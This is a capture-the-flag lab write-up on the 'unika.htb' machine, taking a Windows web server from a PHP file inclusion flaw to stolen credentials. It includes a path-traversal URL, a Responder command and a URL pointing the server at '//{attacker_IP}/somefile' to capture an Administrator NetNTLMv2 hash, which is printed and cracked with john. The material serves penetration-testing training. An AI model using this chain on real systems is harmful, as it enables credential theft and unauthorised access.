## New Technology Lan Manager 

Microsoft employs NTLM (New Technology LAN Manager) & Kerberos for authentication services.
This lab focuses on how a File Inclusion vulnerability on a webpage being served on a windows machine can be exploited to collect the NetNTLMv2 challenge of the user that is running the web server. We will use a utility called Responder to capture a NetNTLMv2 hash.

Windows Remote Management, or WinRM, is a Windows-native built-in remote management protocol that basically uses Simple Object Access Protocol to interact with remote computers and servers, as well as Operating Systems and applications. 
```
WinRM allows the user to :
→ Remotely communicate and interface with hosts
→ Execute commands remotely on systems that are not local to you but are network accessible.
→ Monitor, manage and configure servers, operating systems and client machines from a remote location.
```
As a pentester, this means that if we can find credentials (typically username and password) for a user who
has remote management privileges, we can potentially get a PowerShell shell on the host.



The website has redirected the browser to a new URL, and your host doesn't know how to find unika.htb. 
This webserver is employing name-based Virtual Hosting for serving the requests.

Name-Based Virtual hosting is a method for hosting multiple domain names (with separate handling of each name) on a single server. 
This allows one server to share its resources, such as memory and processor cycles, without requiring all the services to be used by the same hostname.
The web server checks the domain name provided in the Host header field of the HTTP request and sends a response according to that.

```
echo "10.129.136.91   unika.htb" | sudo tee -a /etc/hosts
```
Adding this entry in the /etc/hosts file will enable the browser to resolve the hostname unika.htb to
the corresponding IP address & thus make the browser include the HTTP header Host: unika.htb in
every HTTP request that the browser sends to this IP address, which will make the server respond with the
webpage for unika.htb.



File Inclusion Vulnerability

Dynamic websites include HTML pages on the fly using information from the HTTP request to include GET
and POST parameters, cookies, and other variables. It is common for a page to "include" another page
based on some of these parameters.

LFI or Local File Inclusion occurs when an attacker is able to get a website to include a file that was not
intended to be an option for this application. A common example is when an application uses the path to a file as input. 
If the application treats this input as trusted, and the required sanitary checks are not performed on this input, then the attacker can exploit it by using the ../ string in the inputted file name and eventually view sensitive files in the local file system. 
In some limited cases, an LFI can lead to code execution as well.

RFI or Remote File Inclusion is similar to LFI but in this case it is possible for an attacker to load a remote file on the host using protocols like HTTP, FTP etc.

We test the page parameter to see if we can include files on the target system in the server response.
One of the most common files that a penetration tester might attempt to access on a Windows machine to verify LFI is the hosts file :
```
WINDOWS\System32\drivers\etc\hosts
```
The ../ string is used to traverse back a directory, one at a time. Thus multiple ../ strings are
included in the URL so that the file handler on the server traverses back to the base directory i.e. C:\.
```
http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
```

The file inclusion, in this case, was made possible because in the backend the include() method of PHP is
being used to process the URL parameter page for serving a different webpage for different languages.
And because no proper sanitization is being done on this page parameter, we were able to pass malicious
input and therefore view the internal system files.
The  include statement takes all the text/code/markup that exists in the specified file and loads it into the
memory, making it available for use.

NTLM is a collection of authentication protocols created by Microsoft. It is a challenge-response
authentication protocol used to authenticate a client to a resource on an Active Directory domain.
```
The NTLM authentication process is done in the following way :

  1. The client sends the user name and domain name to the server.
  2. The server generates a random character string, referred to as the challenge.
  3. The client encrypts the challenge with the NTLM hash of the user password and sends it back to the server.
  4. The server retrieves the user password (or equivilent).
  5. The server uses the hash value retrieved from the security account database to encrypt the challenge string. 
     The value is then compared to the value received from the client. If the values match, the client is authenticated.
```

A hash function is a one way function that takes any amount of data and returns a fixed size value.
Typically, the result is referred to as a hash, digest, or fingerprint. They are used for storing passwords
more securely, as there's no way to convert the hash directly back to the original data (though there
are attacks to attempt to recover passwords from hashes, as we'll see later). So a server can store a
hash of your password, and when you submit your password to the site, it hashes your input, and
compares the result to the hash in the database, and if they match, it knows you supplied the correct
password.

An NTHash is the output of the algorithm used to store passwords on Windows systems in the SAM
database and on domain controllers. An NTHash is often referred to as an NTLM hash or even just an
NTLM, which is very misleading / confusing.

When the NTLM protocol wants to do authentication over the network, it uses a challenge / response
model as described above. A NetNTLMv2 challenge / response is a string specifically formatted to
include the challenge and response. This is often referred to as a NetNTLMv2 hash, but it's not actually
a hash. Still, it is regularly referred to as a hash because we attack it in the same manner. You'll see
NetNTLMv2 objects referred to as NTLMv2, or even confusingly as NTLM.

In the PHP configuration file php.ini , "allow_url_include" wrapper is set to "Off" by default, indicating that
PHP does not load remote HTTP or FTP URLs to prevent remote file inclusion attacks. However, even if
allow_url_include and allow_url_fopen are set to "Off", PHP will not prevent the loading of SMB URLs.
In our case, we can misuse this functionality to steal the NTLM hash.


Responder will set up a malicious SMB server. When the target machine attempts to perform the NTLM authentication to that server, Responder
sends a challenge back for the server to encrypt with the user's password. When the server responds, Responder will use the challenge and the encrypted response to generate the NetNTLMv2. While we can't reverse the NetNTLMv2, we can try many different common passwords to see if any generate the same
challenge-response, and if we find one, we know that is the password. This is often referred to as hash
cracking.

```
Location of Responder.conf file -
-> for default system install : /usr/share/responder/Responder.conf
-> for github installation   : /installation_directory/Responder.conf

sudo responder -I {network_interface}
```
With the Responder server ready, we tell the server to include a resource from our SMB server by setting
the page parameter as follows via the web browser.
```
http://unika.htb/?page=//{attacker_IP}/somefile
```
In this case, because we have the freedom to specify the address for the SMB share, we specify the IP
address of our attacking machine. Now the server tries to load the resource from our SMB server, and
Responder captures enough of that to get the NetNTLMv2.
```
echo "Administrator::DESKTOP-
H3OF232:1122334455667788:7E0A87A2CCB487AD9B76C7B0AEAEE133:0101000000000000005F3214B534D
801F0E8BB688484C96C0000000002000800420044004F00320001001E00570049004E002D004E0048004500
3800440049003400410053004300510004003400570049004E002D004E00480045003800440049003400410
05300430051002E00420044004F0032002E004C004F00430041004C0003001400420044004F0032002E004C
004F00430041004C0005001400420044004F0032002E004C004F00430041004C0007000800005F3214B534D
801060004000200000008003000300000000000000001000000002000000C2FAF941D04DCECC6A7691EA926
30A77E073056DA8C3F356D47C324C6D6D16F0A0010000000000000000000000000000000000009002000630
06900660073002F00310030002E00310030002E00310034002E00320035000000000000000000" >
hash.txt
```
The NetNTLMv2 includes both the challenge (random text) and the encrypted response.

The hash type is automatically identified by the john command-line tool :
```
john -w=/usr/share/wordlists/rockyou.txt hash.txt

  -w : wordlist to use for cracking the hash
```
5985/tcp WinRM for HTTP

